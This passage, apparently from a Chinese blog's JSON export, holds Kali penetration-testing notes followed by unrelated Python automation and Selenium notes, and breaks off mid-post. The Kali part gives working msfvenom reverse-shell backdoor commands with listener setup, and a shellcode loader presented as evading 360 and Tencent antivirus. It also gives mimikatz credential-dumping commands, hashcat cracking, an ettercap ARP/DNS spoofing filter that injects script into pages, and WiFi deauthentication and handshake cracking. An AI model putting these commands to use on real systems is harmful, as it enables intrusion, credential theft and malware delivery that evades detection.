exit</p>\n<p>​       meterpreter&gt; mimikatz_command -f version //查看版本信息</p>\n<p>​       meterpreter&gt; mimikatz_command -f samdump::hashes //读取本地hash</p>\n<p>​       下载地址：<a href=\"https://github.com/gentilkiwi/mimikatz\">https://github.com/gentilkiwi/mimikatz</a></p>\n<p>——windows hash</p>\n<p>​    在线解密管理员密码</p>\n<p>​    windows系统下的hash密码格式为：</p>\n<p>​    用户名称：RID</p>\n<p>​    LM-HASH值：</p>\n<p>​    NT-HASH值：</p>\n<p>​    LM-NT都是hash算法</p>\n<p>​    在线解密：<a href=\"https://www.objectif-securite.ch/ophcrack\">https://www.objectif-securite.ch/ophcrack</a></p>\n<h2 id=\"MSF-后门生成模块\"><a href=\"#MSF-后门生成模块\" class=\"headerlink\" title=\"MSF-后门生成模块\"></a>MSF-后门生成模块</h2><p>——常见的木马生成</p>\n<p>​    使用MsFvenom快速生成木马并且进行连接</p>\n<p>​    生成一个常见木马文件：</p>\n<p>​    msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -I 5 lhost=192.168.88.134 lport=1250 -f exe&gt;shell.exe</p>\n<p>​    监听模块：use exploit/multi/handler</p>\n<p>​    设置payload：set payload windows/meterpreter/reverse_tcp</p>\n<p>​                set lhost 192.168.x.xx</p>\n<p>​                set lport 1250</p>\n<p>——常见后门生成方式</p>\n<p>\\1.  windows</p>\n<p>msfvenom -platform windows -a x86 -p windows/meterpreter/reverse_tcp -I 3 -e x86/shikata_ga_nai -f exe -o c:\\back.exe</p>\n<p>msfvenom -platform windows -a x86 -p windows/x64/meterpreter/reverse_tcp -f exe -o c:\\back.exe</p>\n<p>\\2.  Linux</p>\n<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f elf&gt;shell.elf</p>\n<p>\\3.  MAC</p>\n<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f macho&gt;shell.macho</p>\n<p>\\4.  PHP</p>\n<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f raw&gt;shell.php</p>\n<p>\\5.  Asp</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f asp&gt;shell.asp</p>\n<p>\\6.  Aspx</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address>LPORT<your port to connect on> -f aspx&gt;shell.aspx</p>\n<p>——绕过360生成测试</p>\n<p>​    生成后门文件绕过360检测</p>\n<p>\\1.  安装编译软件VC++6.0</p>\n<p>\\2.  生成木马后门</p>\n<p>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b ‘\\x00’ lhost=192.168.153.138 lport=1250 -f c</p>\n<p>\\3.  编译C语言为exe文件</p>\n<p>#include “stdafx.h”</p>\n<p>#include &lt;stdio.h&gt;</p>\n<p>#pragma comment(linker, “/subsystem:\\”windows/” /entry:\\”mainCRTStartup””)</p>\n<p>unsigned char buf[]=(这里放生成好的数组)</p>\n<p>main(){((void(*)(void))&amp;buf)();}</p>\n<p>\\4.  测试是否成功</p>\n<p>——绕过腾讯管家生成测试</p>\n<p>\\1.  编译c语言为exe文件</p>\n<p>#include “stdafx.h”</p>\n<p>#include &lt;stdio.h&gt;</p>\n<p>#pragma comment(linker, “/subsystem:\\”windows/” /entry:\\”mainCRTStartup\\””)</p>\n<p>unsigned char buf[]=(这里放生成好的数组)</p>\n<p>main(){((void(*)(void))&amp;buf)();}</p>\n<p>\\2.  测试是否成功</p>\n<h1 id=\"密码破解\"><a href=\"#密码破解\" class=\"headerlink\" title=\"密码破解\"></a>密码破解</h1><h2 id=\"密码破解-Hashcat\"><a href=\"#密码破解-Hashcat\" class=\"headerlink\" title=\"密码破解-Hashcat\"></a>密码破解-Hashcat</h2><p>——简介</p>\n<p>​    hashcat号称世界上最快的密码破解，世界上第一个和唯一的基于GPUGPU规则引擎，免费多GPU（高达128个GPU），多哈希，多操作系统（linux和windows本地二进制文件），多平台（OpenCL和CUDA支持），多算法，资源利用率低，基于字典攻击，支持分布式破解等。目前支持各类公开算法高达247类，市面上公开的密码加密算法基本都支持。</p>\n<p>​    官网：<a href=\"https://hashcat.net/hashcat/\">https://hashcat.net/hashcat/</a></p>\n<p>​    Wiki：<a href=\"https://hashcat.net/wiki/\">https://hashcat.net/wiki/</a></p>\n<p>​    下载地址：<a href=\"https://hashcat.net/files/hashcat-5.1.0.7z\">https://hashcat.net/files/hashcat-5.1.0.7z</a></p>\n<p>​    在渗透测试中我们往往会得到很多hash，需要去解密，而一些在线的网站无法解密出来所以我们就可以使用hash在本地进行密码恢复</p>\n<p>​    彩虹表：<a href=\"https://www.cnblogs.com/bokun-wang/p/3887463.html\">https://www.cnblogs.com/bokun-wang/p/3887463.html</a></p>\n<p>​            <a href=\"https://www.jianshu.com/p/732d9d960411\">https://www.jianshu.com/p/732d9d960411</a></p>\n<p>——扫描模块</p>\n<p>​    # | Mode</p>\n<p> ===+======</p>\n<p> 0 | Straight（字典破解）：基于字典进行破解</p>\n<p> 1 | Combination（组合破解）：基于多个字典进行破解</p>\n<p> 3 | Brute-force（掩码暴力破解）：基于掩码设置进行破解</p>\n<p> 6 | Hybrid Wordlist + Mask（字典+掩码破解）</p>\n<p> 7 | Hybrid Mask + Wordlist（掩码+字典破解）</p>\n<p>——常见掩码设置</p>\n<p>​    ? | Charset</p>\n<p> ===+=========</p>\n<p> l | abcdefghijklmnopqrstuvwxyz [a-z]                纯小写字母</p>\n<p> u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]        纯大写字母</p>\n<p> d | 0123456789         [0-9]             纯数字</p>\n<p> h | 0123456789abcdef      [0-9a-f]          常见小写字母和数字</p>\n<p> H | 0123456789ABCDEF      [0-9A-F]        常见大写字母和数字</p>\n<p> s | !”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~               特殊字符</p>\n<p> a | ?l?u?d?s                                      键盘上所有可见字符</p>\n<p> b | 0x00 - 0xff                         可能是用来匹配像空格这种密码的</p>\n<p>​    八位数字密码：?d?d?d?d?d?d?d?d</p>\n<p>​    八位未知密码：?a?a?a?a?a?a?a?a</p>\n<p>​    前四位为大写字母，后四位为数字：?u?u?u?u?d?d?d?d</p>\n<p>​    前四位是数字或者为小写字母，后四位是大写字母或者数字：?h?h?h?h?H?H?H?H</p>\n<p>​    前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a</p>\n<p>​    6-8位字母密码：–increment –increment-min 6 –increment-max 8 ?l?l?l?l?l?l?l?l</p>\n<p>​    6-8位数字+小写字母密码：–increment –increment-min 6 –increment-max 8 ?h?h?h?h?h?h?h?h</p>\n<p>——常用参数</p>\n<p>​    -a 指定要使用的破解模式，其值参考后面的参数。 “-a 0” 字典攻击， “-a 1” 组合攻击， “-a 3” 掩码攻击。</p>\n<p>​    -m 指定要破解的hash类型，如果不指定类型，则默认是MD5。</p>\n<p>​    -o 指定破解成功后的hash及所对应的明文密码的存放位置，可以用它把破解成功的hash写到指定的文件中。</p>\n<p>​    –force 忽略破解过程中的警告信息，跑单条hash可能需要加上此选项。</p>\n<p>​    –show 显示已经破解的hash所对应的明文</p>\n<p>​    –increment 启用增量破解模式，可以利用此模式让hashcat在指定的密码长度内执行破解过程</p>\n<p>​    –increment-min 密码最小长度，后面直接等于一个整数即可，配置increment模式一起使用。</p>\n<p>​    –increment-max   密码最大长度，同上</p>\n<p>​    –outfile-format    指定破解结果的输出格式id，默认是3</p>\n<p>——破解实例</p>\n<p>​    掩码破解</p>\n<p>\\1.  数字破解（8位：12345678）</p>\n<p>hashcat -m 0 -a 3 <hash> ?d?d?d?d?d?d?d?d</p>\n<p>\\2.  小写字母（6位：abcdef）</p>\n<p>hashcat -m 0 -a 3 <hash> ?l?l?l?l?l?l</p>\n<p>\\3.  字母+数字（8位：1a31fa1c）</p>\n<p>hashcat -a 3 -m 0 –force <hash> –increment –increment-min 1 –increment-max 8 ?h?h?h?h?h?h?h?h</p>\n<p>——字典破解</p>\n<p>​    -a 0是指字典破解模式，-o是输出结果到文件中</p>\n<p>​    字典破解密码：</p>\n<p>hashcat -m 0 -a 0 ./dict/hash.txt ./dict/password.txt -o result.txt</p>\n<p>——破解实例</p>\n<p>\\1.  破解windows hash</p>\n<p>使用mimikatz获取windows hash:需要管理员权限</p>\n<p>mimikatz log</p>\n<p>mimikatz # privilege::debug</p>\n<p>mimikatz # sekurlsa::logonpasswords</p>\n<p>mimikatz # exit</p>\n<p>NT-hash: hashcat -a 3 -m 1000 <hash> ?l?l?l?d?d?d?s</p>\n<p>\\2.  zip压缩包破解</p>\n<p>使用zip2john获取哈希值</p>\n<p>设置hash类型：win-zip    扫描模式：掩码模式</p>\n<p>hashcat -m 13600 -a 3 <hash> ?d?d?d?d?d?d –show</p>\n<h1 id=\"嗅探\"><a href=\"#嗅探\" class=\"headerlink\" title=\"嗅探\"></a>嗅探</h1><h2 id=\"wireshark初步认识\"><a href=\"#wireshark初步认识\" class=\"headerlink\" title=\"wireshark初步认识\"></a>wireshark初步认识</h2><p>——简介</p>\n<p>​    它是世界上最流行的网络分析工具，这个强大的工具可以捕捉网络中的数据，并为用户提供关于网络和上层协议的各种信息。注：wireshark只能查看数据包，而不能修改数据包的内容，或者发送数据包。</p>\n<p>​    官网：<a href=\"https://www.wireshark.org/\">https://www.wireshark.org</a></p>\n<p>​    下载地址：<a href=\"https://www.wireshark.org/#download\">https://www.wireshark.org/#download</a></p>\n<p>​    Wiki：<a href=\"https://wiki.wireshark.org/\">https://wiki.wireshark.org/</a></p>\n<p>​    可以通过wireshark进行分析网络进程的数据包。</p>\n<p>——初步使用</p>\n<p>​    比较运算符和逻辑运算符</p>\n<p>​    comparison operators（比较运算符）：可以使用6种比较运算符：</p>\n<p>​    英文写法      C语言写法        含义</p>\n<p>​    eq            ==               等于</p>\n<p>​    ne            !=                不等于</p>\n<p>​    gt             &gt;                大于</p>\n<p>​    lt             &lt;                小于</p>\n<p>​    ge            &gt;=               大于等于</p>\n<p>​    le             &lt;=               小于等于</p>\n<p>​    logical expressions（逻辑运算符）</p>\n<p>​    英文写法      C语言写法        含义</p>\n<p>​    and           &amp;&amp;               逻辑与</p>\n<p>​    or             ||                 逻辑或</p>\n<p>​    xor            ^^               逻辑异或</p>\n<p>​    not           !                 逻辑非</p>\n<p>——常见的过滤器</p>\n<p>\\1.  协议过滤</p>\n<p>http.request.method == “POST” or icmp.type   显示post请求的数据包或icmp协议的数据包</p>\n<p>​       ip.addr == 192.168.x.xx 显示ip地址192.168.x.xx相关的数据包</p>\n<p>​       ip.src == 10.230.0.0/16  显示来自该网址网段的数据包</p>\n<p>​       http.host == “192.168.x.xx” 显示该主机相关的数据包</p>\n<p>​       tcp.port == 25  显示来源或目的的tcp端口号位25的数据包</p>\n<p>​       tcp.dstport == 25   显示目的TCP端口号为25的数据包</p>\n<p>​       http.response.code == 302  显示http响应状态码为302的数据包</p>\n<p>\\2.  内容过滤</p>\n<p>contains: Does the protocol, field or slice contain a value</p>\n<p>tcp contains “http”  显示包含http字符串的tcp数据包</p>\n<p>http.host contains “192.168.x.xx” 显示包含该主机的数据包</p>\n<p>——MSF嗅探数据包分析</p>\n<p>\\1.  通过分析存在nginx解析漏洞，通过上传图片马得到webshell。</p>\n<p>\\2.  生成MSF后门上传到对方服务器并执行，获取system权限。</p>\n<p>\\3.  开启嗅探并导出文件</p>\n<p>load sniffer     sniffer_interfaces   sniffer_start 2   sniffer_stop 2</p>\n<p>sniffer_dump 2 22.pc.ap</p>\n<p>\\4.  wireshark分析数据包，通过获取的数据包分析到对方明文传输密码</p>\n<p>——WSExplorer分析</p>\n<p>​    对软件进程数据包进行分析</p>\n<h2 id=\"DNS劫持-Ettercap\"><a href=\"#DNS劫持-Ettercap\" class=\"headerlink\" title=\"DNS劫持-Ettercap\"></a>DNS劫持-Ettercap</h2><p>——ARP协议简介</p>\n<p>​    ARP（Address Resolution Protocol）即地址解析协议，用于实现从IP地址到MAC地址的映射，即询问目标ip对应的MAC地址。</p>\n<p>​    我们能够通过修改mac地址来达到中间人拦截、局域网流控、流量欺骗等情况。</p>\n<p>——ettercap简介</p>\n<p>​    Ettercap是一个综合性的中间人攻击工具，使用它可以进行ARP欺骗、拦截器、DNS欺骗等常见的中间人攻击。</p>\n<p>​    特点：图形化、命令行</p>\n<p>​    官网：<a href=\"http://www.ettercap-project.org/\">http://www.ettercap-project.org/</a></p>\n<p>​    插件：<a href=\"https://linux.die.net/man/8/ettercap_plugins\">https://linux.die.net/man/8/ettercap_plugins</a></p>\n<p>​    过滤器：<a href=\"https://linux.die.net/man/8/etterfilter\">https://linux.die.net/man/8/etterfilter</a></p>\n<p>——Ettercap常用命令</p>\n<p>\\1.  用户界面类型</p>\n<p>-T, -text    使用只显示字符的界面</p>\n<p>-q, -quiet   安静模式，不显示抓到的数据包内容</p>\n<p>-G, -gtk    使用GTK+GUI，开启图形化模式</p>\n<p>​    \\2. 日志选项</p>\n<p>​       -w, -write <file>    将嗅探到的数据写入pcap文件<file></p>\n<p>​       -L, -log <logfile>   此处记录所有流量<logfile></p>\n<p>​    \\3. 通用选项</p>\n<p>​       -i, -iface <iface>   使用该网络接口</p>\n<p>​       -l, -liface          显示所有的网络接口</p>\n<p>​       -P, -plugin <plugin>   开始该插件</p>\n<p>​       -F, -filter <file>    加载过滤器<file> （内容过滤）</p>\n<p>​    \\4. 嗅探与攻击选项</p>\n<p>​       -M, mitm（方法：ARGS）  执行mitm攻击</p>\n<p>——Ettercap案例</p>\n<p>​    —ettercap开启dns欺骗</p>\n<p>\\1.  开启apache服务</p>\n<p>编辑html文件：leafpad /var/www/html/</p>\n<p>service apache2 start</p>\n<p>\\2.  编辑ettercap配置文件</p>\n<p>leafpad /etc/Ettercap/etter.dns</p>\n<p>\\3.  Ettercap使用图形化</p>\n<p>Ettercap -G</p>\n<p>\\4.  命令行测试</p>\n<p>Ettercap -qT -i eth0 -M arp:remote -w 1.pcap /192.168.x.xx//192.168.xx.xxx/</p>\n<p>—ettercap替换网页内容-钓鱼</p>\n<p>\\1.  准备过滤器脚本</p>\n<p>官方示例脚本：/usr/share/Ettercap/etter filter.examples</p>\n<p>\\2.  编译脚本</p>\n<p>etterfilter head.filter -o head.ef      //head.filter为脚本</p>\n<p>\\3.  受害者访问http网站</p>\n<p>—过滤器脚本</p>\n<p> if (ip.proto == TCP &amp;&amp; tcp.dst == 80) {</p>\n<p>​    if (search(DATA.data, “Accept-Encoding”)) {</p>\n<p>​              replace(“Accept-Encoding”, “Accept-Nothing”);</p>\n<p>}</p>\n<p>}</p>\n<p>if (ip.proto == TCP &amp;&amp; tcp.src == 80) {</p>\n<p>​    if (search(DATA.data, “<head>”)) {</p>\n<p>​    replace(“<head>”, “<head><script>alert(‘2333’)</script>”);</p>\n<p>​    msg(“inject head”);</p>\n<p>}</p>\n<p>}</p>\n<p>该过滤脚本的作用是在http网站中替换<head>内容。</p>\n<h1 id=\"无线破解\"><a href=\"#无线破解\" class=\"headerlink\" title=\"无线破解\"></a>无线破解</h1><h2 id=\"无线WIFI破解\"><a href=\"#无线WIFI破解\" class=\"headerlink\" title=\"无线WIFI破解\"></a>无线WIFI破解</h2><p>——aircrack-ng简介</p>\n<p>​    它是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a, 802.11b, 802.11g的数据。该程序可运行在linux和windows上。</p>\n<p>​    开源项目：<a href=\"https://github.com/aircrack-ng/aircrack-ng\">https://github.com/aircrack-ng/aircrack-ng</a></p>\n<p>​    官网：<a href=\"https://www.aircrack-ng.org/\">https://www.aircrack-ng.org/</a></p>\n<p>​    教程：<a href=\"https://www.aircrack-ng.org/~~V/doku.php?id=tutorial\">https://www.aircrack-ng.org/~~V/doku.php?id=tutorial</a></p>\n<p>——破解流程</p>\n<p>\\1.  查看网卡设备</p>\n<p>命令：ifconfig/iwconfig</p>\n<p>\\2.  查看是否支持监听模式</p>\n<p>命令：airmon-ng</p>\n<p>\\3.  开启无线网卡监听模式</p>\n<p>airmon-ng start wlan0</p>\n<p>\\4.  查看周围WIFI网络</p>\n<p>airodump-ng wlan0mon</p>\n<p>\\5.  监听目标网络的握手包</p>\n<p>airodump-ng -c 11 –bssid 2C:57:31:60:27:E6 -w ~/1/ wlan0mon</p>\n<p>参数解释：</p>\n<p>-c 指定频道号</p>\n<p>-bssid 指定路由器bssid</p>\n<p>-w 指定抓取的数据包保存位置</p>\n<p>​    \\6. 强制对方WIFI断开重连（获取握手包）</p>\n<p>​       aireplay-ng -0 2 -a 2C:57:31:60:27:E6 -c 60AB:67:F2:F5:A8 wlan0mon</p>\n<p>​       参数解释：-0 表示发起（鉴权）deauthentication攻击</p>\n<p>​                  -a 指定无线路由器BSSID</p>\n<p>​                  -c 指定强制断开的设备</p>\n<p>​    \\7. 破解握手包密码</p>\n<p>​       aircrack-ng -a2 -b 52:8F:4C:67:B1:91 -w pass.txt ~/-01/*.cap</p>\n<p>​       参数解释：-a2 代表WPA的握手包</p>\n<p>​                  -b 指定要破解的wifi BSSID</p>\n<p>​                  -w 指定字典文件</p>\n<p>​                  最后是抓取的包</p>\n<p>​    \\8. 关闭监听模式</p>\n<p>​       airmon-ng stop wlanmon</p>\n","categories":["linux"],"tags":["kali"]},{"title":"python-automation","url":"/2022/08/17/python-automation/","content":"<h1 id=\"http网络协议-txt\"><a href=\"#http网络协议-txt\" class=\"headerlink\" title=\"http网络协议.txt\"></a>http网络协议.txt</h1><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">HTTP, HTTPS:</span><br><span class=\"line\">    http://域名(URL)来访问一个系统。</span><br><span class=\"line\">    是TCP之上的一种协议，处于应用层，用于数据的交互，通过请求/响应的形态来实现通信</span><br><span class=\"line\">    URL:统一资源定位符（类似于在UI自动化中的xpath元素定位）</span><br><span class=\"line\">    url的格式：</span><br><span class=\"line\">    网络协议://IP: PORT/path?args1=xxx&amp;args2=xxx</span><br><span class=\"line\"></span><br><span class=\"line\">通信原理：</span><br><span class=\"line\">    1.浏览器基于URL中的域名解析出IP地址</span><br><span class=\"line\">    2.根据查询到的IP地址与服务器建立连接</span><br><span class=\"line\">    3.构造HTTP请求，填充头部信息（定义本次数据交互的规范化格式），通信数据内容（所提交的数据内容）</span><br><span class=\"line\">    4.服务器基于请求返回响应结果</span><br><span class=\"line\">    5.基于HTML渲染，进行数据提示</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">请求方法：</span><br><span class=\"line\">    get：用于获取</span><br><span class=\"line\">        URL的长度是有限制的，所以get请求实际在运行时有提交参数的长度限制</span><br><span class=\"line\">    post：用于提交表单</span><br><span class=\"line\">        在实际请求时可以不考虑长度</span><br><span class=\"line\"></span><br><span class=\"line\">HTTP网络协议默认是无状态连接，在2版本以上的HTTP网络协议开始提供长连接</span><br><span class=\"line\"></span><br><span class=\"line\">在整个系统的数据交互过程中，所有的接口在请求时都是独立的个体，在HTTP协议中，</span><br><span class=\"line\">上一次请求与当前请求毫无关联，</span><br><span class=\"line\">这也就是为什么我们需要通过鉴权机制来实现业务上的关联</span><br><span class=\"line\">例如：每次访问页面，速度特别慢，所以第一次访问时，会在客户端保存cookie文件</span><br><span class=\"line\"></span><br><span class=\"line\">cookie, session, token三者之间的区别</span><br><span class=\"line\">早期就只是简单的文档，图片的相关内容的浏览</span><br><span class=\"line\">中期的系统开发以交互为主要的系统实现内容，要交互就需要有对话，</span><br><span class=\"line\">于是就有了session，会话ID(sessionid)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"selenium自动化测试的实现-txt\"><a href=\"#selenium自动化测试的实现-txt\" class=\"headerlink\" title=\"selenium自动化测试的实现.txt\"></a>selenium自动化测试的实现.txt</h1><figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.环境的部署：</span><br><span class=\"line\">    1.搭建编程环境：PYTHON3.7+</span><br><span class=\"line\">    2.搭建Selenium环境</span><br><span class=\"line\">        安装指令：pip install selenium --default-timeout=1000</span><br><span class=\"line\">        安装出错解决方法：</span><br><span class=\"line\">            1.升级pip</span><br><span class=\"line\">            2.遇到超时错误，readtimeout error, 把default指令加载到末尾即可</span><br><span class=\"line\">    3.搭建Webdriver环境</span><br><span class=\"line\">        将下载的webdriver文件放到python的安装路径。</span><br><span class=\"line\">        PS: 自动化执行，所有的浏览器安装在默认路径</span><br><span class=\"line\">    4.实现测试</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"TestforWebUI-–-selenium-py\"><a href=\"#TestforWebUI-–-selenium-py\" class=\"headerlink\" title=\"TestforWebUI – selenium.py\"></a>TestforWebUI – selenium.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">Selenium的运行机制</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Selenium  --&gt; Webdriver --&gt;  Webbrowser</span></span><br><span class=\"line\"><span class=\"string\">          &lt;--     |      &lt;--</span></span><br><span class=\"line\"><span class=\"string\">Selenium hello world</span></span><br><span class=\"line\"><span class=\"string\">1.创建浏览器</span></span><br><span class=\"line\"><span class=\"string\">2.访问百度</span></span><br><span class=\"line\"><span class=\"string\">3.输入搜索条件</span></span><br><span class=\"line\"><span class=\"string\">4.点击搜索按钮</span></span><br><span class=\"line\"><span class=\"string\">5.关闭浏览器</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#导入Selenium包</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#启动浏览器，访问指定的URL</span></span><br><span class=\"line\">driver = webdriver.Edge()</span><br><span class=\"line\">driver.get(<span class=\"string\">&quot;http://www.baidu.com&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#查找输入框，输入关键字</span></span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">&quot;kw&quot;</span>).send_keys(<span class=\"string\">&quot;电影看看&quot;</span>)</span><br><span class=\"line\">driver.find_element_by_id(<span class=\"string\">&quot;su&quot;</span>).click()</span><br><span class=\"line\">sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"comment\">#点击第一条搜索结果</span></span><br><span class=\"line\">driver.find_element_by_xpath(<span class=\"string\">&#x27;//*[@id=&quot;1&quot;]/h3/a&#x27;</span>).click()</span><br><span class=\"line\"></span><br><span class=\"line\">sleep(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\">#关闭浏览器，释放资源</span></span><br><span class=\"line\"><span class=\"comment\">#quit结束进程，关闭浏览器，close关闭当前句柄页页面</span></span><br><span class=\"line\"><span class=\"comment\"># driver.quit()</span></span><br><span class=\"line\"><span class=\"comment\">#　切换句柄</span></span><br><span class=\"line\">handles = driver.window_handles</span><br><span class=\"line\">driver.close()</span><br><span class=\"line\">driver.switch_to.window(handles[<span class=\"number\">1</span>])</span><br><span class=\"line\">driver.close()</span><br><span class=\"line\"><span class=\"comment\"># print(driver.window_handles)</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"webdriverlink-txt\"><a href=\"#webdriverlink-txt\" class=\"headerlink\" title=\"webdriverlink.txt\"></a>webdriverlink.txt</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Chrome浏览器驱动下载地址：http://chromedriver.storage.googleapis.com/index.html</span><br><span class=\"line\"></span><br><span class=\"line\">Firfox浏览器驱动下载地址：https://github.com/mozilla/geckodriver/releases</span><br><span class=\"line\"></span><br><span class=\"line\">IE浏览器驱动下载地址：http://docs.seleniumhq.org/download/</span><br><span class=\"line\"></span><br><span class=\"line\">Edge浏览器驱动下载地址：https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/</span><br><span class=\"line\"></span><br><span class=\"line\">https://www.selenium.dev/downloads/</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"接口测试–Request-py\"><a href=\"#接口测试–Request-py\" class=\"headerlink\" title=\"接口测试–Request.py\"></a>接口测试–Request.py</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 网络协议：HTTP是核心的协议</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\"># 接口：是为系统提供服务的一种形式</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">请求--传话通道--服务端接收请求的地方--结果--传话通道--返回响应</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">1.规范</span></span><br><span class=\"line\"><span class=\"string\">    url = 网络协议：//IP:Port/path?args1=&amp;args2=</span></span><br><span class=\"line\"><span class=\"string\">    http://www.baidu.com</span></span><br><span class=\"line\"><span class=\"string\">    = http://182.61.200.6:80</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=python&amp;fenlei=256&amp;rsv_pq=80b2444e0011736d&amp;rsv_t=06a0z4Ojuehp2lnNZfoABJQqJyVmUxhbIc8EncEkKfc6jRsyjejo809wQko&amp;rqlang=cn&amp;rsv_enter=0&amp;rsv_dl=tb&amp;rsv_sug3=6&amp;rsv_sug1=6&amp;rsv_sug7=100&amp;rsv_btype=i&amp;prefixsug=python&amp;rsp=3&amp;inputT=6144&amp;rsv_sug4=6144</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">2.基本信息：</span></span><br><span class=\"line\"><span class=\"string\">    http端口默认80</span></span><br><span class=\"line\"><span class=\"string\">    https端口默认443</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">3.请求的方法：</span></span><br><span class=\"line\"><span class=\"string\">    method: get和post是核心，选择何种请求方法，是根据接口来决定的</span></span><br><span class=\"line\"><span class=\"string\">    在企业中，所有的系统都是有接口的，接口都是依据接口文档进行实现的</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Requests实现接口测试：</span></span><br><span class=\"line\"><span class=\"string\">1.环境安装</span></span><br><span class=\"line\"><span class=\"string\">pip install requests</span></span><br><span class=\"line\"><span class=\"string\">2.接口测试：</span></span><br><span class=\"line\"><span class=\"string\">    响应状态码：用于表示本次请求的发送是否完成，完成状态是什么？</span></span><br><span class=\"line\"><span class=\"string\">    2**，表示成功</span></span><br><span class=\"line\"><span class=\"string\">    3**，表示重定向</span></span><br><span class=\"line\"><span class=\"string\">    4**，路径错误</span></span><br><span class=\"line\"><span class=\"string\">    5**，系统异常</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 实现一个get请求的测试效果</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;https://www.baidu.com/&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># data = &#123;&#x27;wd&#x27;: &#x27;python&#x27;&#125;</span></span><br><span class=\"line\"><span class=\"comment\"># res = requests.get(url=url, params=data)</span></span><br><span class=\"line\"><span class=\"comment\"># print(res)</span></span><br><span class=\"line\"><span class=\"comment\"># print(res.text)</span></span><br><span class=\"line\">headers = &#123;<span class=\"string\">&quot;xxxx&quot;</span>&#125;</span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;ie&quot;</span>: <span class=\"string\">&quot;utf-16 BE&quot;</span>, <span class=\"string\">&quot;wd&quot;</span>: <span class=\"string\">&quot;pycharm&quot;</span>&#125;</span><br><span class=\"line\">res = requests.post(url=url, headers=headers, data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res.text)</span><br><span class=\"line\"><span class=\"comment\"># 断言校验</span></span><br><span class=\"line\">text = json.loads(res.text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(text[<span class=\"string\">&#x27;&lt;/html&gt;&#x27;</span>])</span><br><span class=\"line\"><span class=\"keyword\">assert</span> <span class=\"string\">&#x27;&lt;/html&gt;&#x27;</span> == text[<span class=\"string\">&#x27;&lt;/html&gt;&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["python"],"tags":["automation"]},{"title":"python-web-flask-1","url":"/2022/08/17/python-web-flask-1/","content":"<h1 id=\"WEB应用开发-Flask第一天\"><a href=\"#WEB应用开发-Flask第一天\" class=\"headerlink\" title=\"WEB应用开发-Flask第一天\"></a>WEB应用开发-Flask第一天</h1><h2 id=\"一、WEB应用服务的认知\"><a href=\"#一、WEB应用服务的认知\" class=\"headerlink\" 